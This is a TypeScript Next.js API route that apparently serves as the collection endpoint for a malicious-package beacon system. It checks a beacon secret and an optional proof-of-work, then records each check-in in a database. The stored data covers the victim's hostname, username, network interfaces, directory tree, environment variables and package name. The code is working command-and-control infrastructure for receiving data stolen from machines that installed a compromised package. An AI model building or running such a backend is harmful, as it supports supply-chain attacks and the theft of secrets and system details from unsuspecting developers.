import { NextResponse } from 'next/server';
import crypto from 'crypto';
import db from '@/lib/db';

export async function POST(req: Request) {
  const body = await req.json().catch(() => null);
  if (!body) return NextResponse.json({ error: 'invalid json' }, { status: 400 });

  // Verify beacon secret
  const expectedSecret = (db.prepare("SELECT value FROM settings WHERE key = 'beacon_secret'").get() as { value: string } | undefined)?.value;
  if (!expectedSecret || body.beacon_secret !== expectedSecret) {
    return NextResponse.json({ error: 'unauthorized' }, { status: 403 });
  }

  // Verify PoW if enabled
  const powEnabled = (db.prepare("SELECT value FROM settings WHERE key = 'pow_enabled'").get() as { value: string } | undefined)?.value === '1';
  if (powEnabled) {
    const { pow_nonce, pow_solution } = body;
    if (!pow_nonce || pow_solution === undefined) {
      return NextResponse.json({ error: 'pow required' }, { status: 403 });
    }
    // Check nonce exists and not expired
    const challenge = db.prepare(
      'SELECT nonce FROM pow_challenges WHERE nonce = ? AND created_at > unixepoch() - 900'
    ).get(pow_nonce) as { nonce: string } | undefined;
    if (!challenge) return NextResponse.json({ error: 'invalid or expired pow nonce' }, { status: 403 });

    // Verify solution: SHA256(nonce + solution) must start with `difficulty` zero hex chars
    const difficulty = parseInt(
      (db.prepare("SELECT value FROM settings WHERE key = 'pow_difficulty'").get() as { value: string } | undefined)?.value ?? '5',
      10
    ) || 5;
    const hash = crypto.createHash('sha256').update(String(pow_nonce) + String(pow_solution)).digest('hex');
    if (!hash.startsWith('0'.repeat(difficulty))) {
      return NextResponse.json({ error: 'invalid pow solution' }, { status: 403 });
    }

    // Consume nonce (one-time use)
    db.prepare('DELETE FROM pow_challenges WHERE nonce = ?').run(pow_nonce);
  }

  const { beacon_id, pkg, hostname, username, platform, arch, os_release, interfaces, dir_tree, env_vars, cwd } = body;
  if (!beacon_id) return NextResponse.json({ error: 'beacon_id required' }, { status: 400 });

  db.prepare(`
    INSERT INTO beacons (beacon_id, pkg_name, hostname, username, platform, arch, os_release, interfaces, dir_tree, env_vars, cwd, last_seen)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, unixepoch())
    ON CONFLICT(beacon_id) DO UPDATE SET
      pkg_name = excluded.pkg_name,
      hostname = excluded.hostname,
      username = excluded.username,
      platform = excluded.platform,
      arch = excluded.arch,
      os_release = excluded.os_release,
      interfaces = excluded.interfaces,
      dir_tree = excluded.dir_tree,
      env_vars = excluded.env_vars,
      cwd = excluded.cwd,
      last_seen = unixepoch()
  `).run(
    beacon_id, pkg, hostname, username, platform, arch, os_release,
    typeof interfaces === 'string' ? interfaces : JSON.stringify(interfaces),
    typeof dir_tree === 'string' ? dir_tree : JSON.stringify(dir_tree),
    typeof env_vars === 'string' ? env_vars : JSON.stringify(env_vars),
    cwd
  );

  const beacon = db.prepare('SELECT id FROM beacons WHERE beacon_id = ?').get(beacon_id) as { id: number };
  return NextResponse.json({ id: beacon.id });
}
